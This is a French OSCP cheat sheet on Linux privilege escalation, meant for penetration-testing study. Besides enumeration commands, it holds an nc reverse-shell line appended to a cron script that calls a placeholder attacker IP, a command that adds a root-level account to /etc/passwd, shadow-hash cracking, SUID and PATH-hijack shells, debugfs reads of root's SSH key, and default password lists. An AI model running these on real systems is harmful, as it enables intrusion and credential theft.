---
title: "OSCP · Élévation de privilèges Linux"
description: "Examiner les permissions, processus et configurations d'un système Linux."
---

# OSCP · Élévation de privilèges Linux

Examiner les permissions, processus et configurations d'un système Linux.


## Énumération


**Utilisateur actuel**


<p class="oscp-command-note">Afficher l&#x27;identité Unix et les groupes.</p>

```text
id

```


**Hostname**


<p class="oscp-command-note">Afficher le nom de la machine.</p>

```text
hostname

```


**OS versions and architecture**


<p class="oscp-command-note">Lire un fichier.</p>

```text
cat /etc/issue

```


```text
cat /etc/os-release

```


<p class="oscp-command-note">Afficher le système et la version du noyau.</p>

```text
uname -a

```


**Running processes**


<p class="oscp-command-note">Afficher les processus actifs.</p>

```text
ps aux

```


**Interfaces réseau, itinéraires, connexions, ports ouverts**


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```text
ip a

```




```text
ss -anp

```


**Firewall rules**


<p class="oscp-command-note">Lire un fichier.</p>

```text
cat /etc/iptables/rules.v4

```


**Scheduled cron tasks**


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```text
ls -lah /etc/cron*

```




```text
crontab -l

```


```bash
# Examiner les tâches cron
sudo crontab -l

```


**Installed applications**


<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>

```text
dpkg -l

```


**Paramètres et repères :**
`/dev/null`  


**Sensitive writable files (excluding /dev/null )**


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```text
find / -writable -type d 2>/dev/null

```


**In memory passwords**


<p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>

```text
strings /dev/mem -n10 | grep -i PASS

```


**Trouver des fichiers sensibles**




```text
locate password | more

```


**Mounted drives**


<p class="oscp-command-note">Lire un fichier.</p>

```text
cat /etc/fstab

```




```text
mount

```




```text
lsblk

```


**Device drivers and kernel modules**




```text
lsmod

```




```text
/sbin/modinfo <driver_name>

```


**SUID binaries**


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```text
find / -perm -u=s -type f 2>/dev/null

```




```bash
sudo -l

```




```bash
sudo -i

```


**Paramètres et repères :**
`unix-privesc-check`  


**Automated Énumération**


## Examiner les services




```bash
watch -n 1 "ps -aux | grep pass"

```


**Paramètres et repères :**
`tcpdump`  




```bash
# Capturer le trafic réseau
sudo tcpdump -i lo -A | grep "pass"

```


```bash
# Capturer le trafic réseau
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111

```


## Tâches cron

Examiner les permissions et la configuration de Linux.


<p class="oscp-command-note">Rechercher un motif textuel.</p>

```bash
grep "CRON" /var/log/syslog
# Autre possibilité
cat /var/log/cron.log

```


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
ls -lah /path/to/script.sh

```


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh

```


<p class="oscp-command-note">Script shell dans la rubrique « Tâches cron ».</p>

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

```


### /etc/passwd


<p class="oscp-command-note">Examiner une connexion TLS ou un certificat.</p>

```bash
openssl passwd Password123

```


**Paramètres et repères :**
`/etc/passwd`  




```bash
# Ce n'est qu'un exemple en utilisant la sortie de la commande précédente.
echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd

```


<p class="oscp-command-note">Script shell dans la rubrique « /etc/passwd ».</p>

```bash
su newroot

# Vérifier l'accès racine
id

```


### /etc/shadow


<p class="oscp-command-note">Lire un fichier.</p>

```bash
cat /etc/shadow | grep [root_user] > [root_user]_hash.txt

```


<p class="oscp-command-note">Analyser des empreintes avec John.</p>

```bash
# John L'Éventreur
john --wordlist=/usr/share/wordlists/rockyou.txt [root_user]_hash.txt

# Hashcat, nous devons isoler la partie de hachage, par exemple du hachage supérieur serait: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt

```


```bash
# John L'Éventreur
john --show [root_user]_hash.txt

# Hashcat
hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show

```


### Binaires SUID


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
find / -perm -4000 -type f 2>/dev/null

```


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
ls -l $(find / -perm -4000 -type f 2>/dev/null)

```


### Exploiting Setuid Binaries


<p class="oscp-command-note">Afficher les processus actifs.</p>

```bash
ps u -C [binary_name]

```


<p class="oscp-command-note">Lire un fichier.</p>

```bash
cat /proc/[PID]/status | grep Uid

```


**Paramètres et repères :**
`find`  


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
find [directory] -exec [path_to_shell] \;

```


```bash
# Remplacer [vulnerable_binary] par le nom du binaire que vous ciblez.
find / -name [vulnerable_binary] -exec /bin/bash -p \;

```


### Capabilities




```bash
/usr/sbin/getcap -r / 2>/dev/null

```


<p class="oscp-command-note">Script shell dans la rubrique « Capabilities ».</p>

```bash
getcap [binary_path]

# Par exemple
getcap /usr/bin/nmap

```




```bash
setcap [capabilities] [binary_path]

# Exemple pour ajouter CAP_DAC_OVERRIDE à un binaire
setcap cap_dac_override=eip /path/to/binary

```


```bash
setcap -r [binary_path]

# Par exemple
setcap -r /usr/bin/nmap

```


### Capacités Linux


**CAP_AUDIT_CONTROL**

Allows enabling or disabling kernel auditing. · Can be used to disable auditing mechanisms and evade detection.


**CAP_AUDIT_WRITE**

Allows writing records to the kernel auditing log. · Can be used to manipulate or inject log entries, potentially covering up malicious activities.


**CAP_BLOCK_SUSPEND**


**CAP_CHOWN**


**CAP_DAC_OVERRIDE**


**CAP_DAC_READ_SEARCH**

Bypasses file and directory read and execute permission checks. · Allows reading and searching files and directories that would normally be restricted.


**CAP_FOWNER**


**CAP_IPC_LOCK**


**CAP_KILL**


**CAP_MAC_ADMIN**


**CAP_NET_BIND_SERVICE**


**CAP_NET_RAW**


**CAP_SETGID**


**CAP_SETPCAP**


**CAP_SETUID**


## Risques liés à sudo

Examiner les permissions et la configuration de Linux.




```bash
sudo -l

```


<p class="oscp-command-note">Rechercher un motif textuel.</p>

```bash
grep [process_name] /var/log/syslog

```


## Vulnérabilités du noyau


**CVE-2010-3904**

RDS · Linux Kernel <= 2.6.36-rc8 · Exploit


**CVE-2010-4258**

Full Nelson · Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) · Exploit


**CVE-2012-0056**

Mempodipper · Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) · Exploit


**CVE-2016-5195**

DirtyCow · Linux Kernel <= 3.19.0-73.8 · Exploit 1 Exploit 2


**CVE-2016-5696**

TCP Remote Code Execution · Linux Kernel 3.6 - 4.7 · Exploit


**CVE-2017-8890**

Race Condition in Linux Kernel · Linux Kernel < 4.11.6 · Exploit


**CVE-2018-8897**

Insecure Use of a Memory Barrier · Linux Kernel 3.14 - 4.15 · Exploit


**CVE-2019-7304**

Race Condition in OverlayFS · Linux Kernel 4.10 - 4.15 · Exploit


**CVE-2021-4034**

PwnKit · Linux Kernel 4.4 - 5.8 · Exploit


**CVE-2020-14386**

Privilege Escalation via OverlayFS · Linux Kernel 4.8 - 5.7 · Exploit


**CVE-2021-3156**

Sudo Privilege Escalation · Sudo versions < 1.9.5p2 · Exploit


**CVE-2021-33034**

Privilege Escalation via the Kernel · Linux Kernel 5.4 - 5.10.4 · Exploit


**CVE-2022-0847**

DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit


## Wildcard Exploitation




<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>*</code></p>
<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>?</code></p>
<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>[]</code></p>
### Exploiting Wildcards in Exécution de commandes


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
ls /var/log/*

```




```bash
# Exemple de script vulnérable
tar -cvf archive.tar.gz /var/log/*

```


### Exploiting Wildcards in File Operations




```bash
touch /tmp/file_*

```


<p class="oscp-command-note">Copier les fichiers indiqués.</p>

```bash
# Si un attaquant peut modifier des fichiers dans /etc/, il peut exploiter le wildcard pour écraser ou manipuler des fichiers de configuration critiques.
cp /etc/* /tmp/backup/

```


## Disk Group Permissions




```text
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow

```


## MySQL Élévation de privilèges

Examiner les connexions, la configuration et les requêtes de la base de données.


<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>

```sql
select sys_exec('whoami');
select sys_eval('whoami');

```


## Logiciels intégrés par l'utilisateur


<p class="oscp-command-note">Script shell dans la rubrique « User-Installed Software ».</p>

```bash
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

```


<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>

```bash
# Debian/Ubuntu
dpkg -l

# CentOS/openSUSE/Fedora/RHEL
rpm -qa

# OpenBSD/FreeBSD
pkg_info

```


## Weak, Reused, and Plaintext Passwords

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`config.php`  


<p class="oscp-command-note">Script shell dans la rubrique « Weak, Reused, and Plaintext Passwords ».</p>

```bash
root:root
username:username
username:username1
username:root
username:admin
username:qwerty
username:password

```




```bash
# Anything interesting in the mail folder?
/var/mail
/var/spool/mail

```




```bash
./LinEnum.sh -t -k password

```


### Connexions réseau actives


<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>

```bash
# Liste des services de réseau
netstat -anlp
netstat -ano

```


## World-Writable Scripts Invoked as Root


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World-executable directories
find / -perm -o x -type d 2>/dev/null

# World-writable and executable directories
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

```


## Unmounted FileSystems




```bash
mount -l
cat /etc/fstab

```


## Fichiers SUID et SGID

Examiner les permissions et la configuration de Linux.


### Understanding SUID and GUID

Examiner les permissions et la configuration de Linux.


### Rechercher les fichiers SUID et SGID

Examiner les permissions et la configuration de Linux.


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
# Trouver des fichiers SUID
find / -perm -u=s -type f 2>/dev/null

# Trouver des fichiers GUID
find / -perm -g=s -type f 2>/dev/null

```


### Determining Exploitability


<p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>

```bash
# Option 1: Use strings to examine the contents.
strings /path/to/suid-binary

# Option 2: Check for system calls or file execution.
ltrace /path/to/suid-binary

# Option 3: Exploit PATH Vulnerability: if the SUID binary calls another program (e.g., /bin/cp or /bin/sh), you might be able to manipulate the $PATH variable to run your own malicious binary instead.
# Créer une version malveillante du programme attendu
echo '/bin/sh' > /tmp/cp
chmod +x /tmp/cp

# Modify PATH to prioritize your malicious version
export PATH=/tmp:$PATH

# Exécutez le programme vulnérable SUID
/path/to/suid-program

```


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
# Trouver des fichiers enregistrables SUID
find / -perm -u=s -writable -type f 2>/dev/null

# Si un binaire SUID en écriture est trouvé, vous pouvez injecter votre propre code et l'exécuter avec des privilèges élevés.

```


```bash
# Trouver des scripts dans cronjobs ou répertoires système qui peuvent avoir SUID ou GUID ensemble
find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null

```


### LinPEAS


**Paramètres et repères :**
`./linpeas.sh`  




```bash
./linpeas.sh | tee linpeas_output.txt

```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# 1. Télécharger le fichier de la victime à la Kali locale, nous pourrions utiliser les techniques de la section 17.

# 2. Convert .txt to .json.
python3 peas2json.py ./linpeas_output.txt peass.json

# 3. Convert .json to .html.
python3 json2html.py peass.json peass.html

# (Optional) We could also convert it to PDF.
python3 json2pdf.py peass.json peass.pdf

```


### LinEnum


<p class="oscp-command-note">Script shell dans la rubrique « LinEnum ».</p>

```bash
./LinEnum.sh

# Rechercher les mots de passe
./LinEnum.sh -t -k password

```


```bash
./LinEnum.sh | tee linenum_output.txt

```


### Unix-privesc-check


**Paramètres et repères :**
`./unix-privesc-check.sh`  




```bash
./unix-privesc-check.sh | tee unix_privesc_check_output.txt

```


### Checksec




```bash
checksec --all

```


### Peepdf




```bash
peepdf.py file.pdf

```


### Outil de recherche de vulnérabilités


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python3 exploit-suggester.py

```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
